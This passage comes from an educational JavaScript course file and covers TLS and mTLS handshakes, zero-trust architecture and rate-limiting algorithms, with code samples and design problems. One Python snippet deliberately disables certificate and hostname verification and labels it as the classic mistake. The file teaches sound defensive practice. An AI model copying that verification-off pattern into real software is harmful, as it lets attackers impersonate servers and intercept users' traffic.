  analogy: `<p>Two people meet in a crowded station and must agree on a secret code. First, you ask to see the other person's <b>passport</b> (certificate) and check that a government you trust (a Certificate Authority) signed it. Then you both do a clever trick (key exchange) to make up a shared secret even though everyone is listening. After that, you talk in that code. <b>TLS</b> checks only the <i>server's</i> passport. <b>mTLS</b> (mutual TLS) means the server also demands the <i>client's</i> passport - both sides prove who they are.</p>`,
  explain: `<p>🟢 <b>What TLS gives you:</b> three promises. <b>Confidentiality</b> (nobody on the network can read it), <b>integrity</b> (nobody can change it unnoticed) and <b>authentication</b> (you are talking to the real <code>api.shop.com</code>). HTTPS = HTTP inside TLS.</p>
  <p>🔵 <b>TLS 1.3 handshake in 1 round trip.</b></p>
  <ol>
    <li><b>ClientHello</b> - client says: "I support these cipher suites, here is my key share (an ephemeral public value), my random, and the server name (SNI)."</li>
    <li><b>ServerHello</b> - server picks the cipher and sends its own key share. Now both can compute the <b>same session keys</b> (ECDHE) - everything after this is encrypted.</li>
    <li><b>Certificate + CertificateVerify</b> - server sends its certificate chain and a signature proving it owns the private key.</li>
    <li><b>Client validates</b> the chain up to a trusted root, checks the hostname matches, checks it is not expired or revoked.</li>
    <li><b>Finished</b> - both sides confirm the handshake was not tampered with. Application data (HTTP) flows, encrypted with AES-GCM or ChaCha20.</li>
  </ol>
  <p>🔴 <b>mTLS adds two messages:</b> the server sends <b>CertificateRequest</b>, and the client replies with <b>its own Certificate + CertificateVerify</b>. The server checks that the client certificate chains to a CA it trusts (usually a private internal CA) and reads the identity from it (e.g. <code>spiffe://prod/ns/payments/sa/api</code>).</p>
  ${H.table(['Feature', 'TLS', 'mTLS'], [
    ['Server proves identity', 'yes', 'yes'],
    ['Client proves identity', 'no (uses password/token later)', 'yes (certificate)'],
    ['Typical use', 'browser to website', 'service to service, partner APIs, zero trust'],
    ['Credential lifetime', 'months (public CA, e.g. 90 days)', 'hours to days (internal CA, automated)'],
    ['Who manages certificates', 'ACME / Let\'s Encrypt', 'service mesh (SPIFFE/SPIRE, Istio, Linkerd), cert-manager']
  ])}
  <p>🟣 <b>Design mTLS between services.</b> Run a private CA (or cloud private CA). Give every workload a short-lived certificate tied to its identity (not an IP). Automate issue and renewal (sidecar or SPIRE agent). Servers verify the peer certificate <i>and</i> authorize by identity ("only the <code>checkout</code> service may call <code>payments</code>"). Encryption without authorization is not enough.</p>`,
  clues: [
    '"service-to-service authentication" / "zero trust inside the cluster" - mTLS with workload identity',
    '"what happens when you type https://..." - DNS, TCP, TLS handshake (certificate, key exchange), HTTP',
    '"certificate expired / unknown CA / hostname mismatch" - chain validation failures',
    '"man-in-the-middle" - certificate validation + HSTS + pinning where justified',
    '"rotate certificates without downtime" - short lifetimes, automated renewal, overlap, reload without restart',
    '"TLS termination at the load balancer?" - traffic behind it is plaintext unless re-encrypted; internal mTLS for sensitive paths'
  ],
  code: [
    { lang: 'python', run: true, title: 'Runnable: what a safe TLS client context looks like (offline)', code: `import ssl

ctx = ssl.create_default_context()                  # loads trusted CAs, enables safe defaults
print('verify mode      :', ctx.verify_mode.name)   # CERT_REQUIRED: server cert must validate
print('check hostname   :', ctx.check_hostname)     # True: cert must match the host we asked for
print('min TLS version  :', ctx.minimum_version.name)
# Refuse anything older than TLS 1.2 explicitly (belt and braces)
ctx.minimum_version = ssl.TLSVersion.TLSv1_2
print('after hardening  :', ctx.minimum_version.name)

# The classic mistake that "fixes" certificate errors by switching security off:
bad = ssl.create_default_context()
bad.check_hostname = False
bad.verify_mode = ssl.CERT_NONE
print('BAD context - verify:', bad.verify_mode.name, '- anyone can impersonate the server. Never ship this.')

# For mTLS the CLIENT side also loads its own certificate:
#   ctx.load_cert_chain(certfile='client.pem', keyfile='client.key')   # paths come from your secret store` },
    { lang: 'java', title: 'Java: restrict protocols and show how mTLS is requested', code: `import javax.net.ssl.*;
import java.util.*;

public class TlsDemo {
    public static void main(String[] args) throws Exception {
        SSLContext ctx = SSLContext.getDefault();          // uses the JVM trust store; verifies chain + hostname
        SSLParameters p = ctx.getDefaultSSLParameters();
        p.setProtocols(new String[] {"TLSv1.3", "TLSv1.2"});   // no SSLv3 / TLS 1.0 / 1.1
        p.setEndpointIdentificationAlgorithm("HTTPS");         // enforce hostname verification
        System.out.println("protocols: " + Arrays.toString(p.getProtocols()));

        // Server side: demand a client certificate (this is what turns TLS into mTLS).
        SSLParameters serverParams = new SSLParameters();
        serverParams.setNeedClientAuth(true);
        System.out.println("server needs client cert: " + serverParams.getNeedClientAuth());
    }
}` },
    { lang: 'yaml', check: false, title: 'Kubernetes / Istio: require mTLS and authorize by identity', code: `apiVersion: security.istio.io/v1\nkind: PeerAuthentication\nmetadata: { name: default, namespace: payments }\nspec:\n  mtls: { mode: STRICT }              # plaintext connections are rejected\n---\napiVersion: security.istio.io/v1\nkind: AuthorizationPolicy\nmetadata: { name: allow-checkout-only, namespace: payments }\nspec:\n  action: ALLOW\n  rules:\n  - from:\n    - source: { principals: ["cluster.local/ns/shop/sa/checkout"] }   # identity from the client certificate\n    to:\n    - operation: { methods: ["POST"], paths: ["/charge"] }` }
  ],
  codeTitle: ['Python: safe vs unsafe TLS context', 'Java: protocols and client auth', 'Istio: STRICT mTLS + identity policy'],
  viz: {
    title: 'TLS 1.3 vs mTLS handshake between two services',
    input: 'mtls',
    inputLabel: 'Type "tls" or "mtls"',
    gen: function (input) {
      var mode = String(input).trim().toLowerCase();
      if (mode !== 'tls' && mode !== 'mtls') throw new Error('Type tls or mtls');
      var m = mode === 'mtls';
      function nodes() { return [{ id: 'C', label: m ? 'Client service (checkout)' : 'Client', x: 18, y: 18, shape: 'box', w: 26 }, { id: 'S', label: 'Server (payments)', x: 80, y: 18, shape: 'box', w: 26 }, { id: 'CA', label: 'Trusted CA', x: 50, y: 42, shape: 'box', w: 20 }]; }
      var steps = [
        ['C-S', 'C', 'ClientHello: supported ciphers, key share, SNI "payments.internal".', 'Both sides have only said hello. Nothing is trusted yet.'],
        ['S-C', 'S', 'ServerHello + key share. Both compute the same session keys (ECDHE). From now on, messages are encrypted.', 'Even a recorded session cannot be decrypted later: keys were ephemeral (forward secrecy).'],
        ['S-C', 'S', 'Server sends Certificate chain + CertificateVerify (signature with its private key)' + (m ? ' + CertificateRequest' : '') + '.', 'The signature proves the server owns the private key matching the certificate.'],
        ['C-CA', 'CA', 'Client validates the chain to a trusted root, checks hostname, expiry, revocation.', 'If the chain, the name or the dates fail, the client must abort. Never disable this check.']
      ];
      if (m) {
        steps.push(['C-S', 'C', 'Client sends ITS Certificate + CertificateVerify.', 'This is the extra step of mTLS: the server learns a cryptographically proven client identity.']);
        steps.push(['S-CA', 'CA', 'Server validates the client certificate against the internal CA and reads the identity (SPIFFE id).', 'Then the authorization policy: is "checkout" allowed to call POST /charge?']);
      }
      steps.push(['C-S', 'C', 'Both send Finished. Application data (HTTP) now flows encrypted.', 'Handshake complete in 1 round trip (TLS 1.3).']);
      var frames = [], i;
      var edgeList = [['C', 'S', 'hello'], ['S', 'C', 'cert'], ['C', 'CA', 'verify'], ['S', 'CA', 'verify']];
      for (i = 0; i < steps.length; i++) {
        var key = steps[i][0], e = {};
        var pair = key.split('-');
        e[pair[0] + '-' + pair[1]] = 'ok';
        if (i === steps.length - 1) e[pair[0] + '-' + pair[1]] = 'sel';
        var hl = {}; hl[steps[i][1]] = 'cur';
        frames.push({ narr: '<b>Step ' + (i + 1) + ' of ' + steps.length + ':</b> ' + steps[i][2] + ' <i>' + steps[i][3] + '</i>', parts: [{ type: 'graph', directed: true, height: 50, nodes: nodes(), edges: edgeList, hl: hl, ehl: e }, { type: 'vars', label: 'Mode', vals: { handshake: m ? 'mTLS (both prove identity)' : 'TLS (server proves identity)', step: (i + 1) + '/' + steps.length } }] });
      }
      if (!m) frames.push({ narr: 'In plain TLS the server has no proof of WHO the client is. It must rely on a later token/password. Switch to <b>mtls</b> to see the extra steps.', parts: [{ type: 'text', html: 'Plain TLS: one-way authentication.' }] });
      return frames;
    }
  },
  examples: [
    { title: 'Design mTLS between 3 services', html: `<p>Services: <code>checkout</code>, <code>payments</code>, <code>ledger</code>. (1) Create a private CA with an offline root and an online intermediate (HSM or cloud KMS-backed). (2) Each pod gets a certificate with a SPIFFE ID, valid 1 hour, renewed automatically at 50% of life by the mesh sidecar. (3) <code>payments</code> accepts only clients whose ID is <code>checkout</code>; <code>ledger</code> accepts only <code>payments</code>. (4) Revocation = short lifetime; no CRL needed. (5) Monitor handshake failures and certificate expiry (alert at 20% remaining).</p>` },
    { title: 'Debug: "x509: certificate signed by unknown authority"', html: `<p>The client does not trust the CA that signed the server certificate, or the server forgot to send the intermediate certificate. Check with <code>openssl s_client -connect host:443 -servername host</code>. Fix by sending the full chain and trusting the right root. <b>Do not</b> set <code>InsecureSkipVerify</code> / <code>verify=False</code> - that removes the authentication promise completely.</p>` },
    { title: 'Where TLS ends: the load balancer', html: `<p>Common design: TLS ends at the load balancer, then plain HTTP to servers. Anyone on the internal network can sniff or inject. For sensitive services re-encrypt (TLS to backends) or use mesh mTLS. Also enable HSTS so browsers never try plain HTTP, and redirect port 80 to 443.</p>` }
  ],
  deepDive: `<p>🟣 <b>Key exchange and forward secrecy.</b> ECDHE creates a fresh key pair per connection. The certificate's key only <i>signs</i> the handshake, it does not encrypt traffic, so stealing the server key later does not decrypt old recordings. TLS 1.3 removed weak options (RSA key exchange, CBC, RC4, SHA-1, renegotiation) and encrypts the certificate itself. <b>0-RTT</b> resumption is faster but replayable - use only for idempotent requests.</p>
  <p><b>PKI chain.</b> Leaf cert (your server) signed by an intermediate, signed by a root that lives in the OS/browser trust store. Validation checks: signature chain, validity dates, key usage, Subject Alternative Name (SAN) matches host (the Common Name is ignored now), revocation (OCSP stapling / CRL; many modern systems prefer short-lived certs instead). <b>Certificate Transparency</b> logs make mis-issued public certificates detectable. <b>Pinning</b> (trusting only a specific key) helps mobile apps but can lock you out when keys change - pin to the intermediate/backup keys and plan rotation.</p>
  <p><b>mTLS operations pain.</b> Expired certificates cause the majority of outages: automate issuance (cert-manager, SPIRE, ACME), reload certificates without restart, monitor expiry. Authorization must use the certificate identity (SAN URI/DNS), not just "any cert signed by our CA". Debug with <code>openssl s_client -cert c.pem -key c.key</code>. Performance: handshake CPU cost is dominated by asymmetric operations; connection reuse (HTTP/2 keep-alive) and session resumption make it negligible. <b>Beyond mTLS:</b> workload identity federation (OIDC tokens) for calls to cloud APIs; token-bound credentials (DPoP) so stolen bearer tokens cannot be replayed.</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> AI assistants constantly "fix" TLS errors by switching verification off (<code>verify=False</code>, <code>rejectUnauthorized: false</code>, <code>InsecureSkipVerify</code>). That compiles, passes the demo, and ships a man-in-the-middle hole. AI agents and MCP servers also connect to many tools over the network: those links need TLS and authentication (mTLS or OAuth with audience-bound tokens), not just "localhost trust". Quantum: large quantum computers could break today's key exchange, so TLS stacks are adding hybrid post-quantum key exchange (X25519 + ML-KEM) - "harvest now, decrypt later" is the reason to care. <b>Use AI as a partner:</b> have it explain an <code>openssl s_client</code> trace line by line, or draft the cert-rotation runbook, then verify against docs. <b>You still own:</b> the trust model - which CA, which identities, and who may call whom.</p>`,
  problems: [
    P('Design mTLS Between Microservices', 'Hard', ['mtls', 'zero trust', 'design'],
      `<p>You run 40 microservices on Kubernetes. Currently they talk plain HTTP inside the cluster behind an API gateway. Design mutual TLS: identity, certificate issuance, rotation, authorization, rollout without outage, and monitoring.</p>`,
      `Zero downtime rollout; some legacy services cannot be changed; certificates must not be long-lived.`,
      `<p>Target: ${H.c('g', 'checkout -> payments: mTLS, identity checkout, allowed POST /charge')} and ${H.c('r', 'random pod -> payments: handshake rejected')}.</p>`,
      `<p>One shared certificate copied into every container image. If one pod is compromised, the key is stolen everywhere and nobody can tell services apart.</p>`,
      { q: 'What makes mTLS useful for authorization?', options: ['It encrypts traffic', 'The client certificate carries a verified service identity', 'It is faster than TLS', 'It removes the need for firewalls'], answer: 1, explain: 'Encryption alone does not say who is calling; the proven identity in the client cert feeds the policy.' },
      [`<p>Hint 1: each workload needs its own identity, not an IP address and not a shared key.</p>`, `<p>Hint 2: a service mesh or SPIRE issues short-lived certificates and rotates them automatically.</p>`, `<p>Hint 3: roll out in PERMISSIVE mode first (accept both), measure plaintext traffic, then switch to STRICT per namespace.</p>`],
      `<p>Identity: use SPIFFE IDs derived from the Kubernetes service account (spiffe://prod/ns/payments/sa/api). Issuance: a mesh control plane (Istio/Linkerd) or SPIRE acts as the CA with an intermediate rooted in an offline root/KMS; sidecars request certificates through the node's attested identity, no secret in the image. Lifetime 1-24 hours, renewed at half life; sidecar hot-reloads so there is no restart. Authorization: default deny AuthorizationPolicy per namespace, then explicit allows by source principal, method and path (checkout may POST /charge). Rollout: install the mesh, inject sidecars gradually, run PERMISSIVE so plaintext still works, use mesh telemetry to find clients still using plaintext, fix them, then flip to STRICT. Legacy services that cannot run a sidecar sit behind a gateway or proxy that terminates mTLS on their behalf, and are listed with an exit plan. Monitoring: handshake failure rate, certificate expiry alerts, CA health, policy denies; a runbook for CA outage (existing certs continue until expiry, so size the lifetime to the recovery time). Gateways and users still authenticate with OAuth tokens; mTLS covers only service identity.</p>`,
      `<p>Handshake CPU is small and amortized by connection reuse; sidecars add about 1-3 ms and some memory per pod.</p>`, ['How do you revoke a compromised workload?', 'What changes for traffic leaving the cluster to a partner API?'])
  ]
});

/* =========================================================
   TOPIC 6 — Zero trust
   ========================================================= */
topics.push({
  title: 'Zero Trust: Never Trust, Always Verify',
  analogy: `<p>The old model is a <b>castle with a moat</b>: once you cross the drawbridge you can wander anywhere. Zero trust is a <b>modern office building</b> where your badge is checked at the front door, at every floor, at the server-room and again at the safe - and the guard also asks "is this the right person, on a healthy laptop, at a normal time, for a reasonable reason?" Being inside the building proves nothing.</p>`,
  explain: `<p>🟢 <b>The big idea.</b> Do not trust a request just because it comes from "inside" the network (office Wi-Fi, VPN, the same Kubernetes cluster). Treat <b>every</b> request as if it came from the open internet: check <b>who</b> is calling, <b>what device/workload</b> they use, <b>what</b> they want, and <b>whether policy allows it right now</b>. This matters because attackers who get one foothold (a phished laptop, a vulnerable pod, an SSRF) otherwise move freely - "lateral movement".</p>
  <p>🔵 <b>Principles.</b> (1) <b>Verify explicitly</b> - authenticate and authorize every request using all available signals. (2) <b>Least privilege</b> - just-enough, just-in-time access, short-lived credentials. (3) <b>Assume breach</b> - segment, encrypt everywhere, log everything, limit blast radius.</p>
  ${H.table(['Check', 'Question', 'Backend example'], [
    ['Identity', 'Who is this (user or service)?', 'OIDC token validated; service mTLS certificate'],
    ['Device / workload health', 'Is it trusted and patched?', 'MDM-compliant laptop; attested pod image'],
    ['Authorization', 'May they do THIS action on THAT resource?', 'Policy engine: allow(subject, action, resource)'],
    ['Context / risk', 'Does this look normal?', 'Geo, time, rate, impossible travel; step-up MFA'],
    ['Network segment', 'Is this path even allowed?', 'NetworkPolicy / security group default-deny'],
    ['Audit', 'Is it recorded?', 'Tamper-evident decision log']
  ])}
  <p>🔴 <b>Architecture.</b> A <b>Policy Enforcement Point</b> (gateway, sidecar, middleware) intercepts each request and asks a <b>Policy Decision Point</b> (OPA, Cedar, OpenFGA) which returns allow/deny with reasons, using data from an identity provider, device inventory and risk engine. Replace the flat VPN with identity-aware proxies (BeyondCorp style). Inside the cluster: mTLS plus default-deny network policies.</p>
  <p>🟣 <b>It is a journey, not a product.</b> Nobody "buys zero trust". Start with strong identity (MFA/passkeys), inventory of assets and flows, default-deny between segments, then keep tightening.</p>`,
  clues: [
    '"zero trust" / "BeyondCorp" / "no implicit trust for internal traffic"',
    '"attacker moved laterally after compromising one service" - segmentation, mTLS, least privilege',
    '"just-in-time access" / "short-lived credentials" - reduce standing privilege',
    '"authorize every request, not just at login" - policy decision per request',
    '"VPN gives access to everything" - replace with identity-aware, per-app access',
    '"service A calls service B" - authenticate the service (mTLS/OIDC), authorize the specific call'
  ],
  code: [
    { lang: 'js', run: true, title: 'Runnable: per-request zero-trust decision', code: `// Every request passes ALL checks, regardless of network location. Order: cheapest and most decisive first.
const policy = [
  { resource: 'payments:charge', roles: ['checkout-service'], needsMfa: false, maxRisk: 30 },
  { resource: 'users:export',    roles: ['admin'],            needsMfa: true,  maxRisk: 10 }
];
function decide(req) {
  const reasons = [];
  if (!req.identityVerified) return { allow: false, reasons: ['identity not verified'] };    // 1. authN
  if (!req.deviceCompliant) reasons.push('device not compliant');                             // 2. device/workload
  const rule = policy.find((p) => p.resource === req.resource);                              // 3. authZ: default deny
  if (!rule) return { allow: false, reasons: ['no rule for resource (default deny)'] };
  if (!rule.roles.includes(req.role)) reasons.push('role ' + req.role + ' not allowed');
  if (rule.needsMfa && !req.mfa) reasons.push('step-up MFA required');
  if (req.risk > rule.maxRisk) reasons.push('risk ' + req.risk + ' > ' + rule.maxRisk);       // 4. context
  return { allow: reasons.length === 0, reasons };
}
const base = { identityVerified: true, deviceCompliant: true, mfa: true, risk: 5 };
console.log('checkout -> charge      :', decide({ ...base, role: 'checkout-service', resource: 'payments:charge' }));
console.log('same pod, other route   :', decide({ ...base, role: 'checkout-service', resource: 'users:export' }));
console.log('admin without MFA       :', decide({ ...base, role: 'admin', mfa: false, resource: 'users:export' }));
console.log('internal IP, no identity:', decide({ ...base, identityVerified: false, role: 'admin', resource: 'users:export' }));` },
    { lang: 'yaml', check: false, title: 'Kubernetes: default-deny network policy, then allow one path', code: `apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata: { name: default-deny, namespace: payments }\nspec:\n  podSelector: {}                 # every pod in the namespace\n  policyTypes: [Ingress, Egress]  # nothing in or out unless allowed below\n---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata: { name: allow-from-checkout, namespace: payments }\nspec:\n  podSelector: { matchLabels: { app: payments-api } }\n  ingress:\n  - from:\n    - namespaceSelector: { matchLabels: { name: shop } }\n      podSelector: { matchLabels: { app: checkout } }\n    ports: [{ port: 8443 }]` }
  ],
  codeTitle: ['JS: policy decision', 'Kubernetes: default deny'],
  viz: {
    title: 'A zero-trust request passing every check',
    input: 'ok',
    inputLabel: 'Failure to simulate: ok, identity, device, authz, risk',
    gen: function (input) {
      var fail = String(input).trim().toLowerCase();
      var order = ['identity', 'device', 'authz', 'risk'];
      if (fail !== 'ok' && order.indexOf(fail) < 0) throw new Error('Type ok, identity, device, authz or risk');
      var labels = { identity: '1. Identity verified (token / mTLS cert)', device: '2. Device or workload healthy', authz: '3. Policy allows this action on this resource', risk: '4. Context risk acceptable (geo, rate, time)' };
      var frames = [], done = [], i;
      frames.push({ narr: 'A request arrives from <b>inside</b> the network. In zero trust that earns it nothing - it must pass every gate.', parts: [{ type: 'queue', label: 'Gates', items: order.map(function (k) { return labels[k]; }), frontLabel: 'first', backLabel: 'last' }, { type: 'vars', label: 'Request', vals: { source: '10.2.3.4 (internal)', action: 'POST /charge' } }] });
      for (i = 0; i < order.length; i++) {
        var k = order[i], bad = k === fail, hl = {};
        for (var j = 0; j < i; j++) hl[j] = 'ok';
        hl[i] = bad ? 'bad' : 'cur';
        frames.push({ narr: bad ? '<span class="c-r">Gate ' + labels[k] + ' FAILED. Request denied, decision written to the audit log. Later gates never run.</span>' : 'Gate passed: <b>' + labels[k] + '</b>.', parts: [{ type: 'queue', label: 'Gates', items: order.map(function (x) { return labels[x]; }), hl: hl, frontLabel: 'first', backLabel: 'last' }, { type: 'vars', label: 'Decision so far', vals: { status: bad ? 'DENY' : 'continue', failedAt: bad ? k : '-' }, hl: { status: bad ? 'bad' : 'ok' } }] });
        if (bad) return frames;
      }
      var allOk = {}; order.forEach(function (x, idx) { allOk[idx] = 'ok'; });
      frames.push({ narr: '<span class="c-g">All four gates passed. Allow the request with a short-lived scoped credential, and log who/what/why.</span>', parts: [{ type: 'queue', label: 'Gates', items: order.map(function (x) { return labels[x]; }), hl: allOk }, { type: 'vars', vals: { decision: 'ALLOW', audit: 'logged' }, hl: { decision: 'ok' } }] });
      return frames;
    }
  },
  examples: [
    { title: 'Replace the VPN for an internal admin tool', html: `<p>Put the tool behind an identity-aware proxy: users sign in with SSO + passkey, the proxy checks group membership and device compliance on <b>every</b> request, and the tool is never reachable from the internet directly. No "full network access" VPN; a stolen laptop cannot scan the network.</p>` },
    { title: 'Contain a compromised pod', html: `<p>The attacker gets code execution in the <code>image-resize</code> pod. With a flat network they scan the database. With zero trust: default-deny NetworkPolicy blocks it, the pod's service account has no cloud permissions, the database requires mTLS identity <code>orders-api</code>, and every denied connection raises an alert. Blast radius = one pod.</p>` },
    { title: 'Step-up authentication', html: `<p>Reading your own profile needs a normal session. Exporting all users or changing payout bank details needs <b>fresh MFA within 5 minutes</b>. The policy asks about the action's risk, not just "is logged in".</p>` }
  ],
  deepDive: `<p>🟣 <b>NIST SP 800-207</b> defines the model: PEP/PDP/PIP (information points), continuous evaluation, and per-session access. Policy languages: OPA/Rego, AWS Cedar, Google Zanzibar-style relation tuples (OpenFGA/SpiceDB). Keep decisions <b>fast</b> (cache policy data, evaluate locally in a sidecar) and <b>explainable</b> (return reasons, log them). A single central policy service in the hot path becomes a reliability risk: decide the failure mode (fail closed for sensitive actions, with a bounded cache for availability).</p>
  <p><b>Workload identity.</b> SPIFFE/SPIRE gives each process a cryptographic identity after attestation of node and workload, so identity does not depend on IPs or shared secrets. For human users: SSO + phishing-resistant MFA (WebAuthn passkeys), short sessions, continuous re-evaluation (revoke on device compromise). <b>Microsegmentation</b> reduces east-west movement; <b>egress control</b> reduces data exfiltration and SSRF impact. <b>Pitfalls:</b> "zero trust" projects that only buy a VPN replacement; policies so complex nobody understands them; over-reliance on a trusted network label in code (<code>if (isInternal(ip))</code>); service accounts with admin rights; long-lived tokens that outlive the checks.</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> AI agents are a new kind of identity: they act on behalf of users, call many tools, and can be manipulated by text they read. Zero trust fits perfectly: give each agent its own identity, scope tools to the minimum, issue short-lived credentials tied to the <i>user's</i> permissions (on-behalf-of tokens), require approval for destructive actions, and log every tool call. Attackers also use AI for faster reconnaissance and convincing phishing/voice deepfakes, so identity proofing and phishing-resistant MFA matter more than "trusting a familiar voice". <b>Use AI as a partner:</b> draft Rego/Cedar policies and tests, summarise denied-request logs, spot overly broad roles - then review by hand. <b>Where AI goes wrong:</b> writes <code>allow = true</code> to make the demo work, or grants <code>*:*</code> permissions. <b>You still own:</b> the policy intent and the least-privilege review.</p>`,
  problems: [
    P('Zero Trust for an Internal Admin Dashboard', 'Medium', ['zero trust', 'design'],
      `<p>Today staff reach an internal admin dashboard over a corporate VPN; anyone on the VPN can open every page. Redesign it with zero-trust principles. List the checks per request, how you grant privileged actions, and what you log.</p>`,
      `300 staff, mixed laptops, some contractors; dashboard can refund orders and export customer data.`,
      `<p>${H.c('r', 'Before: on VPN = full access')} -> ${H.c('g', 'After: SSO + MFA + device check + role + risk, per request')}.</p>`,
      `<p>Keep the VPN and add a login page. After login the user can still call any API and there is no device or risk check; a stolen session works from anywhere.</p>`,
      { q: 'Which statement matches zero trust?', options: ['Internal traffic is trusted', 'Every request is verified regardless of network', 'Only the perimeter needs a firewall', 'Passwords are enough'], answer: 1, explain: 'Network location is not a credential; identity, device, policy and context decide each request.' },
      [`<p>Hint 1: remove "on the network" as a permission.</p>`, `<p>Hint 2: an identity-aware proxy in front, a policy per route, and step-up for dangerous actions.</p>`, `<p>Hint 3: just-in-time admin roles that expire, and audit logs shipped off-box.</p>`],
      `<p>Put the dashboard behind an identity-aware proxy and remove direct network reachability. Per request: valid SSO session (short lifetime, passkey or hardware-key MFA), device compliance from MDM (disk encrypted, OS patched, managed or attested), group-based role from the identity provider, route-level policy (support-agent may view orders, only finance may refund, only data-protection may export), and a risk signal (new country, impossible travel, odd hour, request burst). Privileged actions: step-up with fresh MFA, optional second-person approval for exports and refunds above a limit, and just-in-time elevation (approved, 1-hour expiry, reason recorded). Contractors get separate groups with a smaller scope and no export. Behind the proxy the app trusts only the proxy's signed identity header (verified signature, not a plain header any client could set) and enforces its own authorization again. Logging: every decision with subject, device, action, resource, result and reason in an append-only, hash-chained store with alerts on denied bursts and off-hours exports. Fail-closed for exports and refunds; read-only pages may use a cached policy for a few minutes during a policy-service outage.</p>`,
      `<p>Adds one policy evaluation per request (sub-millisecond when local).</p>`, ['How do you stop the app trusting a forged identity header?', 'How would you roll this out without blocking support staff?'])
  ]
});

/* =========================================================
   TOPIC 7 — Rate limiting / abuse prevention
   ========================================================= */
topics.push({
  title: 'Rate Limiting & Abuse Prevention',
  analogy: `<p>A nightclub has a fire-safety limit of 200 people. The bouncer does not stop the party; he lets people in only as others leave, and if one rowdy group tries to push in 50 at once, he slows them down. Rate limiting is the bouncer for your API: it protects the building (your servers and your other customers) from being crushed by one noisy visitor, whether that visitor is a bug, a bot, or an attacker.</p>`,
  explain: `<p>🟢 <b>Why limit?</b> (1) <b>Availability</b> - one client cannot starve others (DoS, runaway loops). (2) <b>Security</b> - slows password guessing, credential stuffing, OTP brute force, enumeration (the IDOR walk!). (3) <b>Cost</b> - paid downstream APIs and LLM tokens. (4) <b>Fairness</b> - per-plan quotas. The response is <code>429 Too Many Requests</code> with a <code>Retry-After</code> header.</p>
  <p>🔵 <b>Algorithms.</b></p>
  ${H.table(['Algorithm', 'Idea', 'Good', 'Watch out'], [
    ['Fixed window', 'Count per calendar minute', 'Simplest, cheap', 'Burst at the boundary: 2x limit across two windows'],
    ['Sliding window log', 'Keep timestamps of last N seconds', 'Exact', 'Memory O(requests)'],
    ['Sliding window counter', 'Weighted blend of current and previous window', 'Cheap and smooth', 'Approximate'],
    ['Token bucket', 'Bucket refills r tokens/s up to capacity B; each request takes 1', 'Allows controlled bursts', 'Two parameters to tune'],
    ['Leaky bucket', 'Queue drains at a fixed rate', 'Smooth output rate', 'Adds latency, queue can overflow']
  ])}
  <p>🔴 <b>What to key on.</b> API key / user id (authenticated), IP address (anonymous; beware NAT sharing and IPv6 /64 ranges), device fingerprint, and <b>the target account</b> for logins (an attacker rotating IPs against one victim). Apply limits at several layers: CDN/WAF (volumetric), gateway (per client), service (per endpoint cost), and database (connection pool). Use stricter limits for sensitive routes: login, password reset, OTP, search, export, expensive reports.</p>
  <p>🟣 <b>Distributed limiting</b> needs shared state: Redis with an atomic Lua script (or <code>INCR</code> + <code>EXPIRE</code> for fixed window), or approximate local limiters with a periodic sync. Decide fail-open vs fail-closed when the limiter store is down (login: fail-closed or degrade; read APIs: usually fail-open).</p>`,
  clues: [
    '"prevent brute force on login / OTP" - rate limit per account AND per IP, exponential backoff, MFA, CAPTCHA after failures',
    '"design a rate limiter" - algorithm choice, key, storage (Redis), atomicity, headers, failure mode',
    '"allow bursts but cap the average" - token bucket',
    '"smooth, steady output" - leaky bucket',
    '"429 Too Many Requests" and "Retry-After"',
    '"credential stuffing from many IPs" - per-account limits, breached-password checks, bot detection'
  ],
  code: [
    { lang: 'js', run: true, title: 'Runnable: sliding-window rate limiter (log) with a fake clock', code: `// Allow at most "limit" requests in any window of "windowMs" milliseconds, per key.
class SlidingWindowLimiter {
  constructor(limit, windowMs) { this.limit = limit; this.windowMs = windowMs; this.hits = new Map(); }
  allow(key, now) {
    const arr = this.hits.get(key) || [];
    while (arr.length && arr[0] <= now - this.windowMs) arr.shift();   // drop timestamps outside the window
    if (arr.length >= this.limit) {                                   // full: tell the caller when to retry
      this.hits.set(key, arr);
      return { allowed: false, retryAfterMs: arr[0] + this.windowMs - now };
    }
    arr.push(now);
    this.hits.set(key, arr);
    return { allowed: true, remaining: this.limit - arr.length };
  }
}
const rl = new SlidingWindowLimiter(3, 1000);          // 3 requests per second
const times = [0, 100, 200, 300, 900, 1050, 1150, 1300];
for (const t of times) console.log('t=' + t + 'ms ->', JSON.stringify(rl.allow('user-1', t)));
console.log('other user at t=300ms ->', JSON.stringify(rl.allow('user-2', 300)));   // independent bucket per key` },
    { lang: 'python', run: true, title: 'Runnable: token bucket (bursts allowed, average capped)', code: `class TokenBucket:
    def __init__(self, capacity, refill_per_sec):
        self.capacity, self.rate = capacity, refill_per_sec
        self.tokens, self.last = float(capacity), 0.0
    def allow(self, now, cost=1):
        # add tokens for elapsed time, never above capacity
        self.tokens = min(self.capacity, self.tokens + (now - self.last) * self.rate)
        self.last = now
        if self.tokens >= cost:
            self.tokens -= cost
            return True
        return False

b = TokenBucket(capacity=5, refill_per_sec=1)      # burst of 5, then 1 request per second
for t in [0, 0, 0, 0, 0, 0, 0.5, 1.0, 2.0, 2.1]:
    print('t=%.1f' % t, 'allowed' if b.allow(t) else 'REJECTED 429')` },
    { lang: 'java', title: 'Java: login throttle with exponential backoff per account', code: `import java.util.*;

public class LoginThrottle {
    private final Map<String, Integer> failures = new HashMap<>();
    private final Map<String, Long> lockedUntil = new HashMap<>();

    /** Returns 0 if the attempt may proceed, otherwise milliseconds the caller must wait. */
    long check(String account, long nowMs) {
        long until = lockedUntil.getOrDefault(account, 0L);
        return Math.max(0, until - nowMs);
    }
    void recordFailure(String account, long nowMs) {
        int f = failures.merge(account, 1, Integer::sum);
        // 1s, 2s, 4s ... capped at 15 minutes: slows guessing without permanent lockout (which enables DoS on the victim)
        long delay = Math.min(15 * 60_000L, 1000L << Math.min(f - 1, 20));
        lockedUntil.put(account, nowMs + delay);
    }
    void recordSuccess(String account) { failures.remove(account); lockedUntil.remove(account); }

    public static void main(String[] args) {
        LoginThrottle t = new LoginThrottle();
        long now = 0;
        for (int i = 0; i < 5; i++) {
            System.out.println("attempt " + (i + 1) + " wait=" + t.check("asha", now) + "ms");
            t.recordFailure("asha", now);
            now += 100;
        }
    }
}` },
